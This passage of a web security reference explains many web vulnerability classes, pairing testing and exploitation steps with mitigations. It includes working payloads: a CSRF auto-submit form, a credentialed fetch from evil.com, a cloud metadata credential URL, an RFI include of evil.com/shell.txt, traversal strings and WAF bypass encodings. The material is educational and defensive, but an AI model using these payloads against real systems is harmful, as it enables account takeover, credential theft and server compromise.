**What it is.** CSRF tricks an authenticated victim's browser into sending an unintended state-changing request to an app where they are logged in, abusing the fact that the browser auto-attaches cookies/session headers. It partly circumvents the Same-Origin Policy.

**Why it happens.** Three conditions must all hold: there is a worthwhile state-changing action; the app relies only on cookies to identify the user (no extra validation); and the request has no parameters the attacker cannot predict (e.g. it does not require the current password).

**How you test and exploit it.** Identify state-changing endpoints (change email/password, transfer funds, change roles). Inspect the request for an unpredictable anti-CSRF token (`csrf_token`, `csrfmiddlewaretoken`, `authenticity_token`, or an `X-CSRF-Token` header), or a double-submit cookie. Then remove or alter the token and replay - if the action still succeeds, it is vulnerable. Also check token predictability (static, guessable, low-entropy), weak/absent Origin/Referer checks, and whether the action works via GET. A classic PoC is an auto-submitting hidden form on an attacker page:
```
<form action="https://example.com/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@mail.com">
</form><script>document.forms[0].submit()</script>
```
If the logged-in victim loads it, their email silently changes - which enables a password reset and full account takeover.

**Impact.** Any state change performed as the victim - email/password change, fund transfer, settings change; with a privileged victim it can compromise the whole application.

**Mitigations.** Use per-session unpredictable **CSRF tokens** validated server-side on every state-changing request; set **SameSite** (`Lax`/`Strict`, `Secure`) cookies; use the **double-submit cookie** pattern where the token is sent as both a cookie and a header/parameter and must match; require **re-authentication/confirmation** (password, OTP) for sensitive actions; validate **Origin/Referer**; enforce custom headers browsers won't add cross-site (e.g. `X-Requested-With`); and keep sessions short. Note: JSON APIs authenticated by a bearer token in a header are generally not CSRF-able because the browser won't auto-attach that header.

### CORS Misconfiguration
**What it is.** CORS is a browser mechanism, configured by server response headers, that controls which other origins may *read* a cross-origin response - a deliberate, controlled relaxation of the Same-Origin Policy. A misconfiguration lets a malicious origin read authenticated responses.

**Why it happens.** The server reflects the request `Origin` back in `Access-Control-Allow-Origin` without validating it, or trusts the `null` origin, or allows wildcards in sensitive contexts - and does so together with `Access-Control-Allow-Credentials: true`. A CORS misconfiguration is only exploitable when credentials are allowed and sensitive endpoints are reachable cross-origin.

**How you test and exploit it.** Send `Origin: https://evil.com` and inspect the response: if it is reflected in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`, host a page on `evil.com` that does `fetch('https://victim/api/me',{credentials:'include'})` and read the victim's private data. Also test the `null` origin (settable from sandboxed iframes/local files) and weak allow-list regex (`evil-example.com`, `example.com.evil.com`). The key headers are `Access-Control-Allow-Origin/-Methods/-Headers/-Credentials/-Expose-Headers/-Max-Age`.

**Impact.** Cross-origin theft of authenticated/sensitive data; combined with XSS on a trusted origin it can be amplified.

**Mitigations.** Explicitly allow-list specific trusted origins server-side - never reflect the origin blindly, never use `*` for sensitive/credentialed endpoints, and never allow `null`. Remember CORS is a browser control only and is not a substitute for authentication, authorization and session management.

### Server-Side Request Forgery (SSRF)
**What it is.** SSRF tricks the server into making attacker-chosen requests to internal or external resources - the server acts as a proxy that can reach things the attacker cannot reach directly.

**Why it happens.** The app fetches a remote resource (image, webhook, PDF, "import from URL") based on user input without validating or restricting the destination.

**How you test and exploit it.** Find URL-fetching parameters (`url=`, `callback=`, webhooks, image/PDF fetchers). Confirm the server makes outbound requests using Burp Collaborator/Interactsh, then point it at internal targets: `http://127.0.0.1:port`, private ranges, and cloud metadata `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Bypass naive filters with decimal IPs (`2130706433`), `127.1`, IPv6 `[::1]`, DNS rebinding, and redirects. Example: `GET /fetch-image?url=http://localhost:8000/admin` reaches internal admin functionality.

**Impact.** Access to internal-only services, service/port enumeration, firewall bypass, theft of cloud IAM credentials via the metadata endpoint (full account compromise), and sometimes RCE against a reachable vulnerable service. Abused outward, it makes malicious traffic appear to come from the victim org.

**Mitigations.** Validate and allow-list permitted domains/schemes (no wildcards/unsafe regex); avoid letting users supply full URLs; resolve DNS and verify the resulting IP (DNS-rebinding protection); block internal ranges (`127.0.0.1`, `169.254.169.254`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`); segment internal services; apply request timeouts and response-size limits; and don't reflect fetched content back. Enforce IMDSv2 on AWS.

### Open Redirect
**What it is.** The app redirects to a URL taken from user input without validating it, so a link that appears to point at the trusted site actually sends the victim elsewhere.

**Why it happens.** A redirect target (e.g. `?url=`/`?next=`) is used directly in a `Location` header or JS redirect with no destination check.

**How you test and exploit it.** Change the redirect parameter from an internal path to an external one - `https://trusted.com/redirect?url=https://evil.com` - and confirm the browser lands on `evil.com`. Try filter bypasses like `//evil.com`, `/\evil.com`, and encoded payloads.

**Impact.** Phishing (the victim trusts the visible domain), theft of cookies/tokens or OAuth codes when chained, and bypass of redirect-based access controls.

**Mitigations.** Avoid user-controlled redirects; if needed, allow-list trusted destinations, force relative/internal paths only, validate and sanitise to block `//` and encoded bypasses, show a confirmation interstitial for external redirects, and use the framework's safe redirect helpers.

## Authentication & session

### Authentication testing
**What it is.** Authentication confirms identity. Testing it covers credential handling, OTP flows, session establishment, input handling on the login surface, transport security, and business-logic bypasses.

**How you test it.** Work through these cases:
- *Credentials:* weak password policy; default/common creds (admin/admin); brute force and credential stuffing (check for rate limiting, CAPTCHA, lockout); session still valid after password change/logout; user enumeration via differing valid/invalid responses or timings.
- *OTP:* verify the OTP is random and non-sequential; cannot be reused after login; expires; is rate-limited (can't brute-force `000000`-`999999`); is not replayable; is never exposed in logs/response/client code; and that issuing a new OTP invalidates old ones.
- *Session:* cookie flags (`HttpOnly`, `Secure`, `SameSite`); session fixation; invalidation on logout; cookie replay in a fresh browser.
- *Input validation:* SQLi/XSS/CRLF in email and password fields; special characters, long input, null bytes, Unicode.
- *Transport/storage:* HTTPS enforced (no login over HTTP); modern TLS and no weak ciphers; credentials never in GET/URL.
- *Business logic:* forcing the OTP step directly without requesting it; skipping OTP via API manipulation; confirming both login methods yield the same privilege (no escalation); multi-device/multi-session handling.

**Mitigations.** Strong password policy and breach-list checks, MFA, lockout/rate limiting on login and OTP, generic error messages to prevent enumeration, server-side enforcement of every step, HTTPS-only, and slow salted password hashing (see [network-and-fundamentals.md](network-and-fundamentals.md)).

### Session management & attacks
**What it is.** Because HTTP is stateless, a session ties multiple requests to one authenticated user, usually via a session ID stored in a cookie (`Set-Cookie: JSESSIONID=...`). State can be server-side (memory/DB/Redis - stateful, revocable) or client-side/stateless (JWT - scales well but hard to revoke). Since the session represents identity, stealing it means becoming the user.

**Why attacks work.** Weak generation, missing regeneration, missing cookie flags, plaintext transport, or long lifetimes let tokens be guessed, planted, stolen or replayed.

**How you test and exploit it.** Look for: **hijacking** (stealing a token via XSS `document.cookie`, sniffing, or malicious Wi-Fi); **fixation** (the app accepts a known/attacker-set session ID and doesn't regenerate it at login, e.g. `?sessionid=12345` -> victim logs in -> attacker reuses it); **replay** (resubmitting a captured `Authorization: Bearer` with no nonce/timestamp); **puzzling** (injecting session variables like a role before authentication); **sidejacking** (sniffing tokens over insecure HTTP/Wi-Fi); **cookie poisoning** (editing an unsigned cookie `role=user` -> `admin`); **predictable IDs** (incremental/timestamp-based); **timeout issues** (sessions/JWTs that never expire); and **MITM hijacking** (SSL stripping, ARP spoofing). CSRF and XSSI also abuse the authenticated session.

**Impact.** Full impersonation of the victim, privilege escalation via poisoned session data, and indefinite reuse of stolen long-lived tokens.

**Mitigations.** HTTPS everywhere; regenerate the session ID on login/privilege change; set `HttpOnly`, `Secure`, `SameSite`; implement CSRF tokens; invalidate server-side sessions on logout; use short-lived tokens with refresh tokens; and detect anomalies (IP/User-Agent/device mismatch). (JWT and OAuth specifics are in [api-security.md](api-security.md).)

## File & path handling

### Path Traversal (Directory Traversal)
**What it is.** A vulnerability that lets an attacker read files or reach directories outside the intended base directory, because the app uses user input in a file-path operation without checking the file is allowed.

**Why it happens.** The app trusts the user to name the file to open and does not verify the resolved path stays inside an allowed directory.

**How you test and exploit it.** Supply traversal sequences: `../../../../etc/passwd`, encoded variants (`..%2f`, `%252e%252e%252f`), absolute paths, and null-byte truncation on older stacks. **Path traversal vs LFI:** traversal *reads* files, whereas Local File Inclusion causes the included file to be *loaded and executed* (which can escalate to RCE via log poisoning or wrappers).

**Impact.** Disclosure of source code, configuration and credentials; with LFI, code execution.

**Mitigations.** Validate and sanitise input, rejecting `../` and encoded variants; allow-list file names/extensions; resolve and confirm the final path stays within the base directory using `realpath()`/`os.path.abspath()`; avoid using user input in file operations directly; enforce least-privilege file permissions; and block access to sensitive directories at the web-server level.

### File Inclusion (LFI / RFI)
**What it is.** File inclusion abuses a dynamic `include`/`require` whose target is user-controlled. **Local File Inclusion (LFI)** includes and processes a file already on the server; **Remote File Inclusion (RFI)** includes a file fetched from an attacker-controlled URL. RFI is the most dangerous end of the family because the included remote file is executed as code.

**Why it happens.** A dynamic include takes a user-supplied path - e.g. `include($_GET['page'])` - and the platform allows the include to resolve a local path (LFI) or a remote URL (RFI, classically PHP with `allow_url_include=On`).

**How you test and exploit it.** For **RFI**, point the parameter at an attacker-hosted payload - `?page=http://evil.com/shell.txt` where `shell.txt` holds server-side code that then runs in the app's context. For **LFI**, include local files and wrappers: `?page=../../../../etc/passwd`, log files for log poisoning, uploaded files, and PHP wrappers such as `php://filter/convert.base64-encode/resource=index.php` (read source) or `data://`/`expect://` (execution). Both routinely escalate to RCE - RFI directly, LFI via log/session poisoning or a chained upload.

**Impact.** Source and configuration disclosure, and remote code execution leading to full server compromise.

**Mitigations.** Never build include paths from user input; use a fixed allow-list mapping identifiers to known files; disable remote inclusion (`allow_url_include=Off`, `allow_url_fopen=Off`); and canonicalise and confirm any path stays within an allowed directory before use.

### File Upload
**What it is.** An upload feature that insufficiently validates the type or content of uploaded files, letting an attacker store and later execute malicious content.

**Why it happens.** Validation relies on client-supplied, easily spoofed attributes (extension, `Content-Type`) rather than the real file content, and files may be stored in a web-executable directory.

**How you test and exploit it.** Work through the cases: upload non-image types (`.php`, `.exe`, `.js`); use double extensions (`evil.php.jpg`) or case changes (`.pHp`); spoof the `Content-Type` while sending another file type; upload polyglots (valid image with embedded script); test size/resource handling (oversized, 0-byte, huge-dimension, concurrent uploads for DoS); inject payloads into EXIF metadata or the filename (`<script>alert(1)</script>.jpg`, a filename with `../../`, or SQLi in the filename); check storage and access control (is `/uploads/file` directly reachable and executable, can you overwrite another user's file, is there an IDOR on file IDs, is `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` set); upload a disguised webshell (`shell.php.jpg`) and request it directly; use the EICAR test file to check AV; and verify validation is server-side and also applied on hidden/mobile API routes.

**Impact.** Remote code execution (webshell), stored XSS (via filename/SVG), SSRF/DoS, and data exposure via IDOR on uploaded files.

**Mitigations.** Validate by **magic bytes** and by parsing/re-encoding the expected format - not by extension or `Content-Type`; store uploads outside the webroot with no execute permission and randomised, non-user-controlled names; strip metadata; enforce size/type allow-lists; serve downloads with `Content-Disposition: attachment` and `nosniff`; and scan with AV.

### Magic bytes (file signatures)
**What it is.** Magic bytes are a short byte pattern at the start of a file that identifies its real type regardless of extension - e.g. JPEG `FF D8 FF`, PNG `89 50 4E 47 0D 0A 1A 0A`, PDF `25 50 44 46` (`%PDF`), ZIP `50 4B 03 04` (`PK..`), GIF `47 49 46 38` (`GIF8`).

**Why they matter.** Attackers bypass upload filters by renaming `shell.php` to `image.jpg`; checking magic bytes (plus parsing/re-encoding) reveals the true type. But magic-byte checks alone are not enough: **polyglot** files are simultaneously valid as, say, an image and PHP/HTML and can pass a signature check yet execute in some contexts, and servers that trust the `Content-Type` header can be lied to. Proper validation combines magic-byte checks, format parsing/re-encoding, metadata stripping, storage outside the webroot, and renaming with no user-controlled path.

## HTTP-layer attacks

### HTTP Host Header Injection
**What it is.** An attack that abuses a server which trusts the incoming `Host` header (or `X-Forwarded-Host`) and uses it unsafely to build server-side behaviour - injecting a payload directly into the `Host` header.

**Why it happens.** The app reflects or uses the `Host`/`X-Forwarded-Host` value (e.g. to build absolute URLs) without validating it against a known canonical host.

**How you test and exploit it.** Change the `Host` (or add `X-Forwarded-Host`) and look for it being reflected or used - most impactfully in password-reset emails (the reset link points at the attacker's host) and in cache keys (cache poisoning). Also used to route requests to unintended virtual hosts.

**Impact.** Password-reset poisoning and account takeover, web cache poisoning, and routing abuse.

**Mitigations.** Use a server-configured canonical/allow-listed host; never build absolute URLs (especially reset links) from the `Host`/`X-Forwarded-Host` header; validate the header against an allow-list.

### HTTP Request Smuggling
**What it is.** A desync attack exploiting inconsistency between how a front-end (proxy/load balancer/CDN) and a back-end server determine where one HTTP request ends and the next begins, letting an attacker smuggle a hidden request through - often past front-end security controls.

**Why it happens.** HTTP/1 offers two ways to delimit a request body - the `Content-Length` header and `Transfer-Encoding: chunked` - and when the front-end and back-end disagree on which to honour (or parse a malformed one differently), the boundary desyncs. Sending both is invalid per RFC, which is precisely what attackers exploit.

**How you test and exploit it.** The classic variants:
- **CL.TE** - front-end uses `Content-Length`, back-end uses `Transfer-Encoding`; the leftover bytes the front-end ignored are read by the back-end as the start of the next request.
- **TE.CL** - the reverse; the chunked body ends early for the front-end while the back-end keeps reading.
- **TE.TE** - both support `Transfer-Encoding` but one is fooled by an obfuscated header (`Transfer-Encoding : chunked`, `Transfer-Encoding: xchunked`, duplicate TE headers).
- **CL.CL** - two different `Content-Length` values, front-end honouring one and back-end the other.
- **HTTP/2 -> HTTP/1 desync** - when a proxy downgrades HTTP/2 to HTTP/1.1, header normalisation/length differences enable smuggling without classic CL/TE tricks.
- **Method-based** - unusual methods (HEAD, OPTIONS, TRACE) combined with body-handling quirks.

A minimal CL.TE test sends both headers with a small `Content-Length` and a chunked body containing a smuggled request line, then observes whether the next request is affected.

**Impact.** Bypassing authentication and WAFs by hiding payloads, hijacking other users' sessions by prepending to their request, cache poisoning, and cross-user credential theft or forced requests.

**Mitigations.** Use consistent, strict parsing across front-end and back-end; never allow both `Content-Length` and `Transfer-Encoding`; normalise and validate requests at the perimeter; prefer HTTP/2 end-to-end; and keep server software patched.

### Web Cache Poisoning
**What it is.** An attacker manipulates input that a cache (CDN, reverse proxy) stores, so a malicious response is cached under a normal URL and then served to every subsequent user. It is a two-phase attack: an **injection phase** that makes the backend produce a harmful response, and a **caching phase** where that response is stored and replayed.

**Why it happens.** The cache keys a response on some parts of the request (the **keyed** inputs - typically URL and some headers) but ignores others (**unkeyed** inputs) that the backend nonetheless reflects into the response. If an unkeyed input (e.g. `X-Forwarded-Host`) changes the response, the poisoned version gets stored under the normal cache key.

**How you test and exploit it.** Find unkeyed inputs the backend reflects. A classic is `X-Forwarded-Host`: `GET /home?lang=en` with `X-Forwarded-Host: evil.com` where the server reflects it into links, so cached pages point at `evil.com`. Techniques include header-based poisoning (`X-Forwarded-Host/-Scheme`, `X-Original-URL`), query-parameter pollution where an extra param is unkeyed but used by the app, HTTP method confusion, unkeyed cookie/header poisoning, `Vary`-header gaps, encoding tricks (`/%2e%2e/admin`), cookie bombing, `Cache-Control` abuse to cache sensitive responses, and poisoning via cached error pages or redirects. To make the victim load the poisoned copy you must remove any cache buster so your request shares their cache key.

**Impact.** Mass delivery of reflected XSS/JavaScript injection, open redirects, content spoofing/defacement, session-hijacking/phishing support, and cache pollution that breaks the UI.

**Mitigations.** Validate and sanitise all inputs including headers; use strict cache-key definitions that don't vary on untrusted input; set correct `Cache-Control` and `Vary` headers; disable caching where not needed; and avoid reflecting unnecessary request data (especially user-specific data) into responses.

### Web Cache Deception
**What it is.** A trick where the attacker causes a victim's **private, dynamic** response (e.g. account details) to be cached under a path the cache treats as a static, cacheable file, and then retrieves that cached copy to read the victim's data.

**Why it happens.** The cache decides to store a response based on a path's apparent file extension while the backend ignores the extra path segment and still returns the authenticated page - for example requesting `/account.php/nonexistent.css`, which the backend serves as the account page but the cache stores as a `.css` static asset.

**Impact.** Disclosure of another user's private information (PII) that gets cached in a publicly retrievable location.

**Mitigations.** Configure the cache to store only genuinely static responses (verify `Content-Type`, don't cache on extension alone), return appropriate `Cache-Control: no-store` on authenticated responses, and make the backend reject rather than serve mismatched extra path segments.

## Abuse & limits

### Rate Limiting (and bypass)
**What it is.** Rate limiting restricts how many requests a user, IP or client can make in a time window (e.g. 100/min), implemented with token/leaky-bucket or fixed/sliding-window counters, often at a reverse proxy/WAF (Nginx, Cloudflare, API Gateway). Its absence enables brute force, credential stuffing and resource-exhaustion DoS.

**How you test and bypass it.** First establish the **scope** - is the limit per IP, per account, per session/cookie, or global? - and whether it is applied **consistently** across all endpoints. Then try bypasses: multiple accounts/API keys (if keyed to account); IP rotation via VPN/Tor/proxies/botnets (if keyed to IP); header spoofing (`X-Forwarded-For`, `X-Real-IP`); distributed low-and-slow across many clients; parameter manipulation so the backend counts requests as distinct (`/?id=1` vs `/?id=1&x=abc`); **race conditions** (sending a burst in parallel before the counter updates); session/cookie resets; and unprotected alternative endpoints (`/api/v2/login` or a mobile API with no limit). Example: a login limited to 5/min can be beaten by rotating IPs, firing 20 requests at once, or using an unlimited `/mobile/login`.

**Mitigations.** Enforce limits per identity (not only per IP) and uniformly across every endpoint including mobile/legacy versions; make the counter resistant to parallel bursts (atomic increments); don't trust client-settable headers for identity; and pair with lockout, CAPTCHA and anomaly monitoring.

### Race Condition (TOCTOU)
**What it is.** A race condition arises when the result depends on the timing of concurrent requests hitting a non-atomic check-then-act sequence, so firing many requests in parallel makes the application perform an action more times than the logic intended - a time-of-check-to-time-of-use (TOCTOU) flaw.

**Why it happens.** The application reads state, decides, then writes, without a lock or atomic operation - so in the window between the check and the update, parallel requests all still see the old state.

**How you test and exploit it.** Identify a limited or one-time action (redeem a coupon once, withdraw a balance, use an OTP, apply a referral credit), capture the request, and fire a burst simultaneously - Burp Repeater's "send group in parallel" or Turbo Intruder's single-packet attack - then check whether it succeeded more than once, e.g. a $10 voucher applied ten times or a balance over-withdrawn.

**Impact.** Financial loss (double-spend, over-withdrawal), limit bypass (coupon/OTP/referral reuse), and inconsistent data.

**Mitigations.** Make the critical section atomic - database transactions with row locking (`SELECT ... FOR UPDATE`), atomic/conditional updates, unique constraints, or idempotency keys - and enforce single-use at the data layer, never with a read-then-write check in application code.

### HTTP Parameter Pollution (HPP)
**What it is.** Supplying the same parameter more than once (`?role=user&role=admin`) so that different components - WAF, front-end, back-end, framework - disagree on which occurrence counts.

**Why it happens.** There is no single standard for duplicate parameters: some stacks take the first, some the last, some concatenate, some build an array. That inconsistency is the bug.

**How you test and exploit it.** Duplicate a parameter and observe which value the application honours, then use the mismatch to bypass a WAF or validation that inspects one occurrence while the backend uses another, to overwrite a value the server meant to fix, or to tamper with logic. Test both query-string and body parameters and encoded separators.

**Impact.** WAF/filter bypass, access-control and logic bypass, and corruption of server-side values.

**Mitigations.** Normalise and explicitly handle duplicate parameters (reject them or define which wins), validate after normalisation, and keep front-end and back-end parsing consistent.

### Response Manipulation & status-code tampering
**What it is.** A client-side control bypass where the attacker edits the server's response - a body value or the status code - in an intercepting proxy to fool a client that trusts the response for a security decision, e.g. changing `{"success":false}` to `true`, or a `401`/`403` to `200`.

**Why it happens.** The application makes an authorization or flow decision on the client based on the response, instead of enforcing it server-side.

**How you test and exploit it.** In Burp, intercept the response and flip the decisive value or status (`403` -> `200`, `"isAdmin":false` -> `true`, `"otp_valid":false` -> `true`) and see whether the client grants access or advances the flow. It shows up in login/OTP flows, feature gating and payment callbacks.

**Impact.** Authentication/authorization bypass, flow bypass (skipping OTP or payment), and feature unlocking - all because trust was placed on the client.

**Mitigations.** Enforce every security decision server-side; never let the client's reading of a response grant access; treat client-side checks as UX only.

## Defences & evasion

### Web Application Firewall (WAF) - and bypass
**What it is.** A WAF sits in front of the app and monitors, filters or blocks HTTP(S) traffic before it reaches the backend, using rules/signatures and behaviour analysis to catch common attacks (SQLi, XSS, CSRF, RFI, traversal, and - with heuristic/AI engines - some zero-days) without changing app code. It can be network-based (appliance), host-based (software/plugin) or cloud-based (AWS WAF, Cloudflare).

**WAF vs IDS/IPS.** A WAF is a Layer-7, web-application-specific control. An IDS/IPS works across OSI layers 3-7 on network/system traffic: an IDS is passive (detects and alerts), an IPS is inline (detects and blocks). So a port scan raises an IDS alert, a buffer-overflow attempt is dropped by an IPS, and a `?id=1 OR '1'='1'` is blocked by a WAF.

**Why bypasses work.** A WAF generally matches on what it *sees*, which can differ from what the backend *executes* - so the goal is to find that mismatch.

**How you test and bypass it.** First detect it (block pages, headers, `wafw00f`). Then try: **encoding/obfuscation** (URL, double-URL, Unicode, Base64, HTML entities - the WAF misses the pattern but the backend decodes it, e.g. `%3Cscript%3E`, `%2527` -> `%27` -> `'`); **case variation and keyword splitting** (`uNiOn SeLeCt`, `se/**/lect`); **HTTP parameter pollution** (`?id=1&id=2` where WAF reads one and the backend another); **overlong/alternate encodings** and **path-traversal variants** (`..%2f`, `..\\`); **request smuggling/desync**; **allowed-protocol/port tunnelling**; **fragmentation** (splitting payloads across packets the WAF doesn't reassemble, e.g. `<scri`+`pt>`); **Host-header manipulation** (`X-Forwarded-Host`); **alternate HTTP methods** (PUT/DELETE/OPTIONS/PATCH the WAF forgets to filter); and plain **misconfigurations** (allow-all rules, forgotten debug endpoints, abusable whitelisted IPs, or finding the origin IP to skip the WAF entirely).

**Mitigations (defender side).** Normalise/decode input fully before inspection; use strict allow-lists rather than blocklists; pair the WAF with IDS/IPS and secure coding; and monitor logs for anomalies (odd encodings, duplicate params). A WAF is defence-in-depth, never the fix for the underlying bug.

## Infrastructure, DNS & composite outcomes

The classes below are either infrastructure-level issues or high-impact *outcomes* that you reach by chaining the vulnerabilities above rather than single bugs in their own right.

### Subdomain Takeover
**What it is.** An attacker claims a subdomain whose DNS record still points at a third-party service that no longer owns it, letting them host content on the victim's trusted subdomain.

**Why it happens.** A dangling DNS record (CNAME/A) points to a deprovisioned external resource - a deleted GitHub Pages/Heroku/S3/Azure site, an expired SaaS tenant - so whoever registers that resource name next controls the subdomain.

**How you test and exploit it.** Enumerate subdomains (subfinder, amass, crt.sh), resolve them, and look for CNAMEs pointing at services returning a "no such app / bucket not found" fingerprint. Register the dangling resource on that provider and serve your own content on, say, `status.victim.com`; confirm with a benign proof page.

**Impact.** Phishing and malware on a trusted domain, cookie/session theft if cookies are scoped to the parent domain, bypass of domain allow-lists, and OAuth/redirect abuse.

**Mitigations.** Remove DNS records when you decommission a service (de-provision DNS first), monitor continuously for dangling records, and claim/verify the external resource before pointing DNS at it.

### DNS Rebinding
**What it is.** An attack that defeats the Same-Origin Policy's host check by changing the IP a hostname resolves to *after* the page has loaded, so attacker JavaScript can talk to an internal service as if it were same-origin.

**Why it happens.** The browser enforces SOP on the hostname, not the IP. With control of DNS for their own domain and a very short TTL, the attacker first answers with their own IP (to serve the page) then re-answers with an internal IP (`127.0.0.1` or an intranet host), and the browser keeps treating it as the same origin.

**How you test and exploit it.** Host a page on `attacker.com` with a low-TTL record; after load, rebind `attacker.com` to a private/internal IP; the page's JavaScript then issues requests to `attacker.com` that actually hit the internal service and can read responses SOP would normally hide. Often chained with SSRF-style internal access and with services that trust `Host`/`Origin` loosely.

**Impact.** Reaching internal/localhost-only services and admin panels from a victim's browser, cloud-metadata access, and exfiltration of internal responses.

**Mitigations.** Validate the `Host` header against an allow-list on internal services, require authentication (don't trust network position), reject DNS responses that resolve to private ranges, and pin to HTTPS with correct certificates.

### Remote Code Execution (RCE)
**What it is.** The highest-impact outcome - running arbitrary code or commands on the server. RCE is almost always the end of a chain rather than a standalone bug.

**How you reach it.** It is the escalation of classes already covered: OS command injection (direct), SQLi (`xp_cmdshell`, `INTO OUTFILE` webshell), insecure deserialization (gadget chains), SSTI/EL injection (engine -> runtime), unrestricted file upload (webshell), LFI/RFI (include attacker code), and XXE/SSRF reaching an exploitable internal service. Confirm with a benign command whose output or timing you can observe (`id`, `whoami`, a deliberate delay, or an out-of-band DNS/HTTP callback) before anything intrusive.

**Impact.** Full server compromise, data theft, persistence, and lateral movement.

**Mitigations.** Fix the underlying class (parameterise, don't deserialize untrusted data, don't call the shell, validate uploads/includes), run with least privilege, segment and sandbox, and monitor for anomalous process/network activity.

### Account Takeover (ATO)
**What it is.** Any chain whose end result is the attacker controlling another user's account - an outcome assembled from weaker bugs rather than one vulnerability.

**How you reach it.** Common routes already covered: no rate limit on login/OTP (brute force), host-header injection poisoning a password-reset link, IDOR on a reset-token or email-change endpoint, CSRF on email/password change, XSS stealing the session, OAuth `state`/redirect flaws stealing the code, JWT forgery, and response manipulation on an OTP step. The craft is chaining a low-severity bug (say a user-ID disclosure) into another (an IDOR) to get there.

**Impact.** Full control of the victim's account and data; with a privileged victim, application compromise.

**Mitigations.** Rate-limit and lock auth/OTP flows, build reset links from a server-side canonical host with single-use expiring tokens, require current-password/step-up for sensitive changes, set secure cookies, and validate OAuth `state`/redirects.

### Defacement
**What it is.** Unauthorised modification of what a site displays - replacing or altering visible content - to embarrass the owner, spread a message, or support phishing.

**How you reach it.** It is the visible outcome of another flaw: stored XSS or template injection rewriting the page, web cache poisoning serving altered content to everyone, a file upload/RFI overwriting a page, SQLi editing displayed records, or a subdomain takeover.

**Impact.** Reputational damage, loss of trust, and a platform for further phishing/malware.

**Mitigations.** Fix the underlying injection/upload/cache/access-control bug, run integrity monitoring on served content, and keep backups for rapid restoration.

---

# Part D - Tooling & taxonomy

## Burp Repeater vs Intruder
Repeater is for manually editing and resending a single request to observe how the server reacts. Intruder automates sending many requests with payload lists; its attack types are Sniper (one payload set, one position at a time), Battering ram (same payload in all positions), Pitchfork (parallel payload sets), and Cluster bomb (all combinations of multiple sets).

## Vulnerability taxonomy (quick map)
A compact index of the classes above and where each is covered:
- **Injection** - SQLi, NoSQLi, OS command, CRLF, null byte, XXE, SSTI, insecure deserialization, LDAP, XML, XPath, Expression Language, SMTP/email-header injection (this file).
- **Cross-site / client-side** - XSS (reflected/stored/DOM), clickjacking, prototype pollution (this file).
- **Access control & authorization** - Broken Access Control, IDOR, privilege escalation, mass assignment (API file), forced browsing (this file).
- **Request forgery & cross-origin** - CSRF, CORS misconfiguration, SSRF, open redirect (this file).
- **Authentication & session** - auth flaws, session attacks (this file); JWT, OAuth, SAML SSO (API file).
- **File & path** - path traversal, LFI, RFI, file upload, magic-byte bypass (this file).
- **HTTP-layer** - Host-header injection, request smuggling, HTTP parameter pollution, web cache poisoning, web cache deception (this file).
- **Abuse & limits / evasion** - rate limiting, race conditions, response manipulation, WAF bypass (this file).
- **Infrastructure / composite** - subdomain takeover, DNS rebinding, RCE, account takeover, defacement (this file).
- **APIs** - REST/SOAP/GraphQL, BOLA/BFLA, JWT, OAuth, SAML (see [api-security.md](api-security.md)).
- **Mobile** - OWASP Mobile Top 10; Android (see [android-security.md](android-security.md)) and iOS (see [ios-security.md](ios-security.md)).
- **Thick-client** - native/desktop apps, buffer overflow, format string, DLL hijacking (see [thick-client-security.md](thick-client-security.md)).
